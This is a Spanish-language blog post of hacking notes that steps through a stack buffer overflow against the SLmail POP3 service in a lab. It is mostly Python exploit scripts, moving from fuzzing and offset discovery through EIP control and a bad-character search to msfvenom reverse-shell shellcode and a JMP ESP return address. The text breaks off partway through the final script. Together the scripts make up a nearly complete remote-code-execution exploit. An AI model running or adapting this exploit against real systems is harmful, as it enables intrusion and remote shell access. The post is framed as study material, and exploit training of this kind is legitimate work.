---
layout: single
title: Buffer Overflow - Hacking Notes
excerpt: "Apuntes de Buffer Overflow con un ejemplo práctico (Spanish)"
date: 2025-05-21
classes: wide
header:
  teaser: /img2/obsidian.jpg
  teaser_home_page: true
  icon: /img2/images/Dashboard.jpeg
categories:
  - Hacking Notes
  - Buffer Overflow
tags:
  - Buffer Overflow
---

# Índice
-----------
1. [[#Identificar buffer overflow]]
2. [[#Averiguar el offset correspondiente]]
3. [[#Tomar el control del EIP]]
4. [[#Identificar el espacio disponible para la ShellCode]]
5. [[#Identificación de BadChars]]
6. [[#Almacenar el ShellCode en el ESP y rederigir el flujo del EIP hacia el ESP con Jump ESP]]
7. [[#(Opción 1) Ejecutar el Shellcode con NOPs]]
8. [[#(Opción 2) Ejecutar el Shellcode con un desplazamiento de la pila]]
9. [[#Creación de Shellcode controlando el comando]]
10. [[#Si no aparecen resultados en el !mona find -s ...]]

------------------


## Identificar buffer overflow

```python
#/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
total_length = int(sys.argv[1])


if len(sys.argv) !=2:
  print("\n[+] Usage: python3 exploit.py <length>")
  sys.exit(1)


def exploit():
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  s.connect((ip_address,port))

  banner = s.recv(1024)


  s.send(b"USER test" + b'\r\n')

  response = s.recv(1024)

  s.send(b"PASS " + b"A"*total_length + b'\r\n')
  s.close()


if __name__ == '__main__':

  exploit()
```

```bash
python3 exploit.py 10000
```

![](/img2/hqdeeud4.png)

> Para identificar la vulnerabilidad necesitamos exceder el límite de bytes disponibles, en este caso ponemos 10000 "A" y con el debugger vemos que el proceso SLmail.exe se detiene


## Averiguar el offset correspondiente

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110

payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
```

![](/img2/jwx92svl.png)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 7A46317A
```

> Para conseguir el offset, es necesario generar una cadena en hexadecimal generada por /usr/share/metasploit-framework/tools/exploit/pattern_create.rb, para que al mandarla identifiquemos la cadena correspondiente del EIP y indicarsela al script /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb


## Tomar el control del EIP

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

payload = yunk + EIP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
```

![](/img2/s1pdakh4.png)

> Una vez conocemos el offset, solo necesitamos generar un payload con el yunk correspondiente y añadirle 4 valores identificativos


## Identificar el espacio disponible para la ShellCode

```python
import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

after_eip = b"C"*200

payload = yunk + EIP + after_eip


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
```

![](/img2/cguy3q8u.png)

> Vemos que el ESP o pila tiene espacio suficiente para introducir nuestro ShellCode


## Identificación de BadChars

```
!mona config -set workingfolder C:\Users\pyuser\Desktop\Analysis
```

```
!mona bytearray -cpb "\x00"
```

```bash
impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

![](/img2/sqgdocbt.png)

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

ESP = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = yunk + EIP + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```
!mona compare -a 0x0255A128 -f C:\Users\pyuser\Desktop\Analysis\bytearray.bin
```

![](/img2/wobk7l3m.png)

```
!mona bytearray -cpb "\x00\x0a"
```

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

ESP = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = yunk + EIP + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
```

```
!mona compare -a 0x024FA128 -f C:\Users\pyuser\Desktop\Analysis\bytearray.bin
```

![](/img2/dltrv1tn.png)

```
!mona bytearray -cpb "\x00\x0a\x0d"
```

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

ESP = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = yunk + EIP + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3
```

```
!mona compare -a 0x0235A128 -f C:\Users\pyuser\Desktop\Analysis\bytearray.bin
```

![](/img2/zkc6nvwy.png)

> Para identificar los BadChars, es necesario pasarle un conjunto de bytes e ir comparándolos cada vez que salgan nuevos, tenemos que repetir el proceso hasta que no quede ningún BadChars y nos quede nuestro payload con los bytes habilitados.

## Almacenar el ShellCode en el ESP y rederigir el flujo del EIP hacia el ESP con Jump ESP

- Generamos el shellcode sin los BadChars

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.142 LPORT=9000 -f py EXITFUNC=thread -b '\x00\x0a\x0d'
```

```python
#!/usr/bin/env python3


import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = b"B"*4

ESP=(b"\xda\xdf\xd9\x74\x24\xf4\xbd\xdd\x29\x1c\xe4\x5a"
b"\x2b\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x37"
b"\xd5\xfe\x11\x3b\xce\x7d\xd9\xc3\x0f\xe2\x53\x26"
b"\x3e\x22\x07\x23\x11\x92\x43\x61\x9e\x59\x01\x91"
b"\x15\x2f\x8e\x96\x9e\x9a\xe8\x99\x1f\xb6\xc9\xb8"
b"\xa3\xc5\x1d\x1a\x9d\x05\x50\x5b\xda\x78\x99\x09"
b"\xb3\xf7\x0c\xbd\xb0\x42\x8d\x36\x8a\x43\x95\xab"
b"\x5b\x65\xb4\x7a\xd7\x3c\x16\x7d\x34\x35\x1f\x65"
b"\x59\x70\xe9\x1e\xa9\x0e\xe8\xf6\xe3\xef\x47\x37"
b"\xcc\x1d\x99\x70\xeb\xfd\xec\x88\x0f\x83\xf6\x4f"
b"\x6d\x5f\x72\x4b\xd5\x14\x24\xb7\xe7\xf9\xb3\x3c"
b"\xeb\xb6\xb0\x1a\xe8\x49\x14\x11\x14\xc1\x9b\xf5"
b"\x9c\x91\xbf\xd1\xc5\x42\xa1\x40\xa0\x25\xde\x92"
b"\x0b\x99\x7a\xd9\xa6\xce\xf6\x80\xae\x23\x3b\x3a"
b"\x2f\x2c\x4c\x49\x1d\xf3\xe6\xc5\x2d\x7c\x21\x12"
b"\x51\x57\x95\x8c\xac\x58\xe6\x85\x6a\x0c\xb6\xbd"
b"\x5b\x2d\x5d\x3d\x63\xf8\xf2\x6d\xcb\x53\xb3\xdd"
b"\xab\x03\x5b\x37\x24\x7b\x7b\x38\xee\x14\x16\xc3"
b"\x79\xdb\x4f\xca\xf7\xb3\x8d\xcc\x24\x6c\x1b\x2a"
b"\x40\x7c\x4d\xe5\xfd\xe5\xd4\x7d\x9f\xea\xc2\xf8"
b"\x9f\x61\xe1\xfd\x6e\x82\x8c\xed\x07\x62\xdb\x4f"
b"\x81\x7d\xf1\xe7\x4d\xef\x9e\xf7\x18\x0c\x09\xa0"
b"\x4d\xe2\x40\x24\x60\x5d\xfb\x5a\x79\x3b\xc4\xde"
b"\xa6\xf8\xcb\xdf\x2b\x44\xe8\xcf\xf5\x45\xb4\xbb"
b"\xa9\x13\x62\x15\x0c\xca\xc4\xcf\xc6\xa1\x8e\x87"
b"\x9f\x89\x10\xd1\x9f\xc7\xe6\x3d\x11\xbe\xbe\x42"
b"\x9e\x56\x37\x3b\xc2\xc6\xb8\x96\x46\xe6\x5a\x32"
b"\xb3\x8f\xc2\xd7\x7e\xd2\xf4\x02\xbc\xeb\x76\xa6"
b"\x3d\x08\x66\xc3\x38\x54\x20\x38\x31\xc5\xc5\x3e"
b"\xe6\xe6\xcf")


payload = yunk + EIP + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

- Listamos los modulos disponibles y elegimos uno que tenga las protecciones en False

```
!mona modules
```

![](/img2/v2uacxkg.png)

- Obtenemos el Jump ESP

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

![](/img2/zju2ue43.png)

- Buscamos una instrucción de tipo Jump ESP sin los BadChars dentro del módulo elegido

```
!mona find -s "\xFF\xE4" -m SLMFC.DLL
```

![](/img2/gcrhfqu2.png)

- Cambiamos la EIP por la instrucción de tipo Jump ESP en Little Endian

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = pack("<L", 0x5f4c4d13)


ESP=(b"\xda\xdf\xd9\x74\x24\xf4\xbd\xdd\x29\x1c\xe4\x5a"
b"\x2b\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x37"
b"\xd5\xfe\x11\x3b\xce\x7d\xd9\xc3\x0f\xe2\x53\x26"
b"\x3e\x22\x07\x23\x11\x92\x43\x61\x9e\x59\x01\x91"
b"\x15\x2f\x8e\x96\x9e\x9a\xe8\x99\x1f\xb6\xc9\xb8"
b"\xa3\xc5\x1d\x1a\x9d\x05\x50\x5b\xda\x78\x99\x09"
b"\xb3\xf7\x0c\xbd\xb0\x42\x8d\x36\x8a\x43\x95\xab"
b"\x5b\x65\xb4\x7a\xd7\x3c\x16\x7d\x34\x35\x1f\x65"
b"\x59\x70\xe9\x1e\xa9\x0e\xe8\xf6\xe3\xef\x47\x37"
b"\xcc\x1d\x99\x70\xeb\xfd\xec\x88\x0f\x83\xf6\x4f"
b"\x6d\x5f\x72\x4b\xd5\x14\x24\xb7\xe7\xf9\xb3\x3c"
